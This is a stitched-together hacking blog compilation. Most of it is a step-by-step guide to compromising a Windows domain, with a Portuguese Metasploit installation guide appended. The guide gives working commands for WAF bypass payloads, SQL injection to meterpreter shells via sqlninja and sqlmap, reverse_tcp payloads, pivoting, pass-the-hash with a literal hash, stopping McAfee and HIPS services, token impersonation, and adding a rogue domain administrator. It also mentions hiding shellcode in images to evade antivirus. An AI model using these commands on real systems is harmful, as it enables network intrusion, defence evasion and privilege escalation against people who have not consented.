+I hope you enjoy it and I'm always looking for a way to inject shellcode into an image and if possible make it undetectable.
+You will find links who talk about it on my other TuT all methods of evasion antivirus with metasploit
+
+Analysis :
+ascii.bin : https://www.virustotal.com/file/3a2976ff...334400026/
+exec.exe : https://www.virustotal.com/file/da1ba033...334409609/
+
+
+===================================================
+Take Over Entire Windows Domain with Metasploit and sql injection
+===================================================
+
+This is Only for Pen-Testing and security testing purpose illegal use of this concept can be prosecuted
+
+
+Install Metasploit
+
+-------------------------
+
+The Metasploit Framework is well-supported on the Ubuntu platform. The following instructions should also apply to Kubuntu, Xubuntu, and Debian.
+ 
+In most cases, you should use the official binary installers, described in the Generic Linux instructions.  If for some reason, the installer does not work for you, the following instructions should get you up and running.
+ 
+Dependencies
+Install the Ruby dependencies:
+ 
+ $ sudo apt-get install ruby libopenssl-ruby libyaml-ruby libdl-ruby libiconv-ruby libreadline-ruby irb ri rubygems
+ 
+Install the Subversion client:
+ 
+ $ sudo apt-get install subversion
+ 
+In order to build the native extensions (pcaprub, lorcon2, etc), the following packages need to be installed:
+ 
+ $ sudo apt-get install build-essential ruby-dev libpcap-dev
+ 
+Metasploit Framework
+Once the dependencies have been installed, download the Unix tarball from the download page and run the following commands:
+or 
+
+Installing Metasploit Framework on Ubuntu
+
+Recently, I had to install Metasploit Framework on Ubuntu. I thought I would document the instructions here. Be sure to check the downloads page on the Metasploit website (http://www.metasploit.com) to get the current version. At the time of this blog the latest version was 3.5.0.
+
+wget http://updates.metasploit.com/data/releases/framework-3.5.0.tar.bz2
+
+$ bunzip2 framework-3.5.0.tar.bz2
+
+$ tar xvf framework-3.5.0.tar
+
+$ sudo mkdir -p /opt/metasploit3
+
+$ sudo cp -a msf3/ /opt/metasploit3/msf3
+
+$ sudo chown root:root -R /opt/metasploit3/msf3
+
+$ sudo ln -sf /opt/metasploit3/msf3/msf* /usr/local/bin/
+
+$ sudo svn update /opt/msf3/
+
+$ sudo crontab -e -u root # Enter "1 * * * * /usr/bin/svn update  /opt/msf3/ >> /var/log/msf3update.log 2>&1
+ 
+ 
+When you've completed this step, you should have a working installation and be able to run modules, pivot through compromised systems, and use most of the Metasploit Framework's features. The following optional installation steps will give you extra functionality.
+ 
+Database Configuration (optional)
+Now that the framework is installed, you'll want to configure a database connection, and enable the Metasploit Framework to connect to it:
+ 
+For postgres, see postgres_setup (recommended)
+For mysql, see mysql_setup
+ 
+Extensions (optional)
+The Metasploit Framework includes a few native Ruby extensions that must be compiled in order to use certain types of modules.
+ 
+To enable raw socket modules:
+ 
+$ sudo apt-get install libpcap-dev
+$ sudo bash
+# cd /opt/metasploit3/msf3/external/pcaprub/
+# ruby extconf.rb
+# make && make install
+ 
+To enable WiFi modules:
+ 
+$ sudo bash
+# cd  /opt/metasploit3/msf3/external/ruby-lorcon2/
+# svn co http://802.11ninja.net/svn/lorcon/trunk lorcon2
+# cd lorcon2
+# ./configure --prefix=/usr && make && make install
+# cd ..
+# ruby extconf.rb
+# make && make install
+ 
+Updates
+
+The Metasploit Framework is updated daily with the latest exploits, payloads, features, and bug fixes. To update your installation of the Metasploit Framework:
+ 
+$ sudo svn update /opt/metasploit3/msf3/
+ 
+This can also be installed into the root user's crontab:
+ 
+$ sudo crontab -e -u root # enter the line below
+1 * * * * /usr/bin/svn update  /opt/metasploit3/msf3/ >> /var/log/msfupdate.log 2>&1
+
+
+Identifying Load Balancers (Active Reconnaissance)
+-----------------------------------------------------------------------------
+Most load-balancers are deployed for redundancy and performance improvement
+
+As an attacker â€“ load balancers are a headache.You have no idea where you packets are going....
+There is absolutely no point in running tools against a host without knowing if a load balancer has been deployed.
+so some time it shows iis 6 next time you load it shows iis 7 it might be load balance. brother...
+ 
+step 1 is to determine if the host is load balanced....
+Step 2 â€“ determine what type of load balancing is in place (HTTP or DNS)
+
+How can you tell if the target host is behind a load balancer?
+
+Firefox LiveHTTP Headers
+
+- https://addons.mozilla.org/en-US/firefox/addon/3829
+- Look in HTTP header for modifications such as:
+
+1. BIGipServerOS in cookie
+2. nnCoection: close
+3. Cneonction: close
+
+dig
+
+* Look for multiple addresses resolving to one domain name
+* dig google.com
+
+My favourate is Netcraft.com
+
+
+Identifying Intrusion Prevention Systems
+------------------------------------------------------------
+How can you tell if the target host protected an Intrusion Prevention System?
+
+Curl: The netcat of the web app world
+
+http://curl.haxx.se/
+
+curl -i http://www.targetcompany.com/../../WINNT/system32/cmd.exe?d
+curl -i http://www.targetcompany.com/type+c:\winnt\repair\sam._
+
+Look for RSTs and no response....tcpdump/wireshark is your friend ;-)
+
+Active Filter Detection
+- http://www.purehacking.com/afd/downloads.php
+- osstmm-afd -P HTTP -t targetcompany.com -v
+
+Ok, so you're up against an IPS â€“ relax...there are a few other things to consider.
+
+HINT:
+Most IDS/IPS solutions don't monitor SSL encrypted (actually any encrypted) traffic. because your attack is passing in form of encrypted traffic so for example i'm injecting sql inject query IDS dont see those because as said IDS only check for plain text traffic so you need to decrypt traffic using SSL accelarator in front of IDS so it can detect some suspicious traffic. Latest IDS are check for encrypted trffic also but more expansive.
+I dont know why People pay for IPS and run IDS mode fucking Sheet hey dumb ass  turn on IPS  lets block some traffic.
+
+SSL Accelerators are expensive so not everyone has one.
+
+
+Identifying Web Application Firewalls
+--------------------------------------------------------
+
+How can you determine if the target host has deployed a WAF?
+* https://addons.mozilla.org/en-US/firefox/addon/3829
+
+* Look in HTTP header for modifications such as:
+
+1. Cookie Value has WAF info in it
+- BIGipServerwww.google.com_pool_http
+- barra_counter_session
+- WODSESSION
+
+2. Different server response code for hostile request
+- 501 Method Not Implemented this error notify that victim probably deployed web app firewall (WAF)
+
+3. Different "Server" response when hostile packet is sent
+
+WAFs are surprisingly easy to detect?
+-------------------------------------------------------
+
+Generally you just have to send 1 valid request, and one malicious request and diff the response.
+Malicious tends to be any HTTP request that has a payload that contains things like:
+
+   
+    '  â€œ <  ?  #  -  |  ^  *
+
+Bypassing Web Application Firewalls
+--------------------------------------------------------
+
+How can you determine if the target host has deployed a WAF?
+http://packetstormsecurity.org/web/unicode-fun.txt
+
+[sam@LinuxLaptop toolz]$ ruby unicode-fun.rb
+Enter string to URL Unicode:<script>alert('XSS')</script>
+
+%u003c%uff53%uff43%uff52%uff49%uff50%uff54%u003e%uff41%uff4c%uff45%uff52%uff
+54%uff08%u02b9%uff38%uff33%uff33%u02b9%uff09%u003c%u2215%uff53%uff43%uff52
+%uff49%uff50%uff54%u003e
+
+Curl
+
+curl -i http://www.targetcompany.com/3c%73%63%72%69%70%74%3e%61%6c
+%65%72%74%28%27%58%53%53%27%29%3c%2f%73%63%72%69%70%74%3e
+HTTP/1.1 404 Not Found
+Date: Sat, 14 Mar 2009 19:13:10 GMT
+Server: Apache
+
+
+SQL Injection to Metasploit (SQLNinja)
+----------------------------------------------------------
+cd /home/beatdown/toolz/sqlninja-0.2.3/
+
+vi sqlninja.beatdown.conf
+
+host = [target ip]
+
+page = /vuln/vulnpage.asp
+
+stringstart = VulnID=10;
+
+lhost = [your ip]
+
+device = eth0
+
+msfpath = /home/beatdown/toolz/metasploit
+
+resolvedip = [your ip]
+
+./sqlninja -m t -f sqlninja.beatdown.conf (test for injection)
+./sqlninja -m f -f sqlninja.beatdown.conf (fingerprint the backend db)
+./sqlninja -m u -f sqlninja.beatdown.conf (upload dnstun, netcat, or meterpreter)
+./sqlninja -m s -f sqlninja.beatdown.conf (drop a shell)
+
+cd /home/beatdown/toolz/sqlmap-dev
+
+python sqlmap.py -u "http://www.about2bowned.com/vuln/vulnpage.aspx?VulnID=10" --os-shell -v 1
+os-shell>
+
+python sqlmap.py -u "http://www.about2bowned.com/vuln/vulnpage.aspx?VulnID=10" --os-pwn --msf-path /home/beatdown/toolz/metasploit --priv-esc -v 10
+meterpreter>
+
+Getting in via client-side (client side Attack)
+-----------------------------------------------------------------
+
+sudo ./msfconsole
+
+Be sure to run as root so you can set the LPORT to 443
+use exploit/[name of newest browser, PDF, ActiveX, or fileformat exploit]
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+set ExitOnSession false
+set LHOST [your public ip]
+set LPORT 443
+exploit -j
+
+Pivoting In Lan Through Web
+--------------------------------------------
+
+Pivot Attack: Using a compromised host as a launching point to attack other hosts...
+......set up standard exploit
+exploit
+route
+ctrl-z <-- background the session
+
+back <--- you need to get to main msf> prompt
+
+Now set up Pivot with a route add
+route add 192.168.10.131 255.25.255.0 1 <-- Use correct session id
+
+route print <----- verify
+
+use exploit/windows/smb/ms08_067_dcom
+set PAYLOAD windows/shell/bind_tcp
+set RHOST 192.168.10.132
+set LPORT 1234
+
+ctrl-z <-- background the session
+back <--- you need to get to main msf> prompt
+
+Run auxillaries & exploits through your pivot
+use scanner/smb/version
+set RHOSTS 192.168.10.1/24
+run
+
+Common LAN Security Solutions
+--------------------------------------------------
+
+Canâ€™t get on the network?????
+
+1. NO DHCP â€“ static IP addresses
+2. DHCP MAC Address reservations
+3. Port Security
+
+Canâ€™t get on the network?????
+
+1. NO DHCP â€“ static IP addresses
+    -> Steal valid IP address from host
+
+2. DHCP MAC Address reservations
+    -> Steal valid MAC address
+
+3. Port Security
+    -> Steal valid MAC/IP address
+
+Enumerating The Internal Network Against NIPS/HIPS
+--------------------------------------------------------------------------------
+
+c:\set
+c:\net view
+c:\net view /domain
+c:\net user
+c:\net user /domain
+c:\net localgroup
+c:\net localgroup /domain
+c:\net localgroup administrators
+c:\net localgroup administrators /domain
+c:\net group "System Admins" /domain
+c:\net user "ajit.patel" /domain
+c:\nltest /dclist:
+
+Use SET to get domain information and username
+
+Use NET VIEW to get computers in the users domain and other domains
+
+Use NET VIEW to get computers in other domains
+
+Use NET USER to get local users on the computer you are on
+
+All users in the current user's domain
+
+Use NET LOCALGROUP to get the local groups on the computer
+
+Use NET LOCALGROUP to get the domain groups
+
+All users in the local administrators group
+
+All users in the domain administrators group
+
+All users in the "Company Admins" group
+
+All info about this user
+
+List Domain Controllers...
+
+Basically browsing network neighborhood, and querying Active Directory will always be considered legitimate traffic
+to an NIPS so you can use NET commands to enumerate a network without port scanning.
+
+Looking Around the Network For A User
+-----------------------------------------------------------
+
+Some commands to identify a logged in user
+
+NBTSTAT -a remotecomputer | FIND "<03>" | FIND /I /V "remotecomputer"
+
+WMIC /Node:remotecomputer ComputerSystem Get UserName
+
+PSLOGGEDON -L \\remotecomputer
+
+PSEXEC \\remotecomputer NET CONFIG WORKSTATION | FIND /I " name "
+
+PSEXEC \\remotecomputer NET NAME
+
+PSEXEC \\remotecomputer NETSH DIAG SHOW COMPUTER /V | FIND /i "username"
+
+
+Smoking some MSF hash: Moving around the network using password hashes
+-------------------------------------------------------------------------------------------------------------------
+
+use exploit/windows/smb/psexec
+
+set RHOST 192.168.10.20
+
+set SMBUser administrator
+
+set SMBPass 01fc5a6be7bc6929aad3b435b51404ee:0cb6948805f797bf2a82807973b89537
+
+set PAYLOAD windows/shell/reverse_tcp
+
+set LHOST 192.168.10.10
+
+exploit
+
+Killing The HIPS (as SYSTEM with â€œatâ€ command)
+----------------------------------------------------------------------------------
+
+1. Stop the overall AV Framework
+net stop "McAfee Framework Service"
+
+2. Stop the HIPS
+net stop hips
+net stop enterceptagent
+net stop firepm
+
+3. McAfee Processes
+pskill -t UdaterUI
+pskill -t TBMon
+pskill -t Mcshield
+pskill -t VsTskMgr
+pskill -t shstat
+
+4. HIPS Processes
+
+pskill -t firetray
+
+or get system from meterpreter latest ver of metasploit do all for you withing one command
+
+Stealing a domain administrator's token....
+---------------------------------------------------------------
+meterpreter> use incognito
+
+meterpreter> list_tokens -u
+
+meterpreter> impersonate_token "domain\\user"
+
+meterpreter> execute -c -H -f cmd -a "/k" -i -t <--- Use the -t to use your impersonated token
+
+or
+
+meterpreter > list_tokens -g
+
+meterpreter > impersonate_token "DOMAIN\\Domain Admins"
+
+meterpreter> execute -c -H -f cmd -a "/k" -i -t <--- Use the -t to use your impersonated token
+
+Add yourself to the Domain Admin's group
+
+c:\net user sam samrocks$ /domain /add
+
+c:\net localgroup administrators sam /domain /add
+
+
+
+Great Thanks to Joe McCray
+
+ 
+
+Email ThisBlogThis!Share to TwitterShare to FacebookShare to Pinterest
+No comments:
+
+Post a Comment
+
+Home
+Subscribe to: Posts (Atom)
+Blog Archive
+
+    ▼  2012 (287)
+        ▼  July (67)
+            CAPTURE THE FLAG CHALLENGE
+            SCRIPTS Fake Wifi Access Point
+            Basic Steps of Hacking
+            Using Ettercap to improve NetBIOS attacks
+            WEB HACKING
+            SQLMAP For Beginners
+            Creating Backdoors Using SQL Injection
+            Sqlmap Introduction – SQL Injection Walkthrough
+            W3af walkthrough and tutorial
+            Cisco Official Support
+            IP Addressing and Subnetting for New Users
+            Host and Subnet Quantities
+            Subnet Zero and the All-Ones Subnet
+            Disabling Cisco Router Password Recovery Service
+            Cisco Router Password Recovery
+            Installation and Setup of Cisco SG500-52P - 500 Se...
+            Binary & The Internet Protocol
+            Dynamic VLANs
+            The VLAN Concept - Introduction to VLANs
+            Firewall Topologies
+            The Supernetting / CIDR Chart
+            Subnetting Guidelines
+            Subnetting - Bits & Analysis and Routing between S...
+            Intro to DNS and DNS Query Message Format
+            Supernetting In-Depth Analysis
+            DoS & DDoS Attacks
+            DNS Queries & Resolution Process and Response
+            Routing Protocol
+            Firewall DMZ Zone
+            VLANs - IEEE 802.1q Trunk Link Protocol Analysis
+            Internet Protocol Classes - Network & Host ID
+            Quick Overview Of TCP
+            Inter VLAN Routing - Routing between VLAN Networks...
+            NAT Concept and configuration on Cisco Routers
+            ICMP - Echo / Echo Reply (Ping) and request
+            Basic ISDN Configuration
+            WAN Technologies
+            How To Configure ISDN Internet Dialup On A Cisco R...
+            How To Configure Dynamic DNS Server On A Cisco Rou...
+            Introduction To Routers
+            Understanding and Configuring Cisco Router PPP Mul...
+            How To Secure Your Cisco Router Using Cisco AutoSe...
+            Configuring NAT Overload On A Cisco Router
+            Cisco 880W (881W, 886W, 887W, 888W) Multiple - Dua...
+            Configuring Static Route Tracking using IP SLA (Ba...
+            Configuring Dynamic NAT On A Cisco Router
+            Disabling Cisco Router Password Recovery Service
+            How To Configure DHCP Server On A Cisco Router
+            VLAN Security Tips - Best Practices
+            How To Configure Router On A Stick - 802.1q Trunk ...
+            Configuring Policy-Based Routing (PBR) with IP SLA...
+            Configuring Site to Site IPSec VPN Tunnel Between ...
+            Cisco GRE and IPSec - GRE over IPSec - Selecting a...
+            How to Change your Public IPs (clone pfsense)?
+            Basic pfsense to pfsense IPSEC tunnel config
+            Remote Access To Your Home Network Using pfSense a...
+            Setup & Configuration Of OpenVPN On Pfsense Firewa...
+            PfSense 2.0 Configuration of OpenVPN Server with T...
+            OpenVPN with LDAP authentication on pfSense
+            OpenVPN with RADIUS authentication on PfSense
+            Building branch to Head quaters Connection with Op...
+            How To Setup Apache Virtual Host Configuration for...
+            EHCP
+            Postfix Installation on Ubuntu 10.10/11.10
+            How to Deploy Postfix Complete Virtual Mail System...
+            Public DNS Server setup in production
+            How to install GNS3 on fedora by Ajit
+        ►  June (11)
+        ►  May (84)
+        ►  April (125)
+
+Template images by Storman. Powered by Blogger.
+About Me
+
+samadmin
+
+View my complete profile
+
+
+http://linux4dummy.blogspot.com.br/p/metasploit.html
+http://sectools.org/tag/general/
+http://pastebin.com/dyap3srg
+
+https://www.vivaolinux.com.br/dica/Metasploit-no-Debian-8-Jessie
+
+Metasploit no Debian 8 Jessie
+
+
+O Metasploit é uma ferramenta extremamente poderosa, voltada para testes de invasão (Pentest). Com ela, é possível fazer desde um simples scan, até uma invasão completa, explorando vulnerabilidades no sistema operacional ou em programas que estejam instalados no computador alvo.
+
+Para isso, o Metasploit conta com vários exploits e módulos auxiliares, além de alguns complementos. Para maiores informações sobre Metasploit, acesse o site oficial, através do link:
+
+    Penetration Testing Software | Metasploit
+
+
+Aqui no próprio site do VOL, existem diversos artigos relacionados ao Metasploit-Framework.
+
+Bom, chega de papo. Vamos iniciar a instalação do Metasploit.
+
+Primeiramente, recomendo a você atualizar seu sistema, utilizando os comandos:
+
+# apt-get update
+# apt-get dist-upgrade
+
+Após realizado a atualização do sistema, tendo a certeza dos pacotes mais atualizados, iniciaremos a instalação das dependências para Metasploit, para isso instale os seguintes pacotes:
+
+# apt-get install build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev openjdk-7-jre git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev vncviewer libyaml-dev
+
+Instalando versão adequada do Ruby
+Infelizmente, não vem por padrão com uma versão adequada para Linux, para se utilizar com Metasploit, por isso precisaremos baixar e compilar a versão adequada. Para isso, utilizaremos o "rbenv":
+
+# cd ~
+# git clone git://github.com/sstephenson/rbenv.git .rbenv
+# echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
+# echo 'eval "$(rbenv init -)"' >> ~/.bashrc
+# exec $SHELL
+
+# git clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build
+# echo 'export PATH="$HOME/.rbenv/plugins/ruby-build/bin:$PATH"' >> ~/.bashrc
+# exec $SHELL
+
+# rbenv install 2.1.6
+# rbenv global 2.1.6
+# ruby -v
+
+Instalando o Nmap
+Uma das ferramentas externas que Metasploit utiliza para digitalização, que não está incluído com as fontes, é o Nmap. Aqui, vamos realizar o download do código fonte mais recente para o Nmap, compilar e instalar:
+
+# mkdir ~/Desenvolvimento
+# cd ~/Desenvolvimento
+# apt-get install subversion
+# svn co https://svn.nmap.org/nmap
+# cd nmap
+# ./configure
+# make
+# make install
+# make clean
+
+Configurando PostgreSQL server
+Necessariamente primeiro, mudamos para o usuário "postgres" para que possamos criar o usuário a ser utilizado pelo Metasploit, assim como o banco de dados:
+
+# sudo -s
+# su postgres
+createuser -P -S MSF -R -D    #Guarde a senha que cadastrar, pois será necessária
+createdb -O MSF MSF
+exit
+
+Instalando Metasploit Framework
+Vamos baixar a última versão do Metasploit Framework via Git, para que possamos utilizar posteriormente o "msfupdate" e assim mantê-lo atualizado:
+
+# cd /opt
+# git clone https://github.com/rapid7/metasploit-framework.git
+# chown -R `whoami` /opt/metasploit-framework
+# cd metasploit-framework
+# gem install bundler
+# bundle install
+
+Observação: atualmente, há um bug no Metasploit Framework com Symlinks. Por isso, iremos criar os links para comando, para que possamos usá-los em qualquer usuário e não estar necessariamente na pasta do Metasploit, por isso (porém, para isso), precisamos estar na pasta "metasploit-framework":
+
+# bash -c 'for MSF in $(ls msf*); do ln -s /opt/metasploit-framework/$MSF /usr/local/bin/$MSF;done'
+
+Agora iremos criar o arquivo "database.yml", que conterá os parâmetros de configuração que será utilizado pelo Metasploit-Framework:
+
+produção:
+   adaptador: postgresql
+   banco de dados: msf
+   usuário: msf
+   password: (senha criada no junto com usuário msf)
+   host: 127.0.0.1
+   port: 5432
+   piscina: 75
+   timeout: 5
+
+Agora, iremos criar a variável de ambiente para que ele seja carregado pelo "msfconsole" ao executar a variável em sua shell atual:
+
+# sh -c "echo export MSF_DATABASE_CONFIG=/opt/metasploit-framework/config/database.yml >> /etc/profile"
+# source /etc/profile
+
+Primeira execução
+Feitos todos os procedimentos acima, estamos pronto para executar o Metasploit pela sua primeira vez.
+
+Na primeira vez ao ser executado, ele irá criar as entradas necessárias para o Metasploit no banco de dados, por isso pode levar algum tempo para carregar.
+
+# msfconsole
+
+
+Referência utilizada:
+
+    Installing Metasploit in Ubuntu and Debian
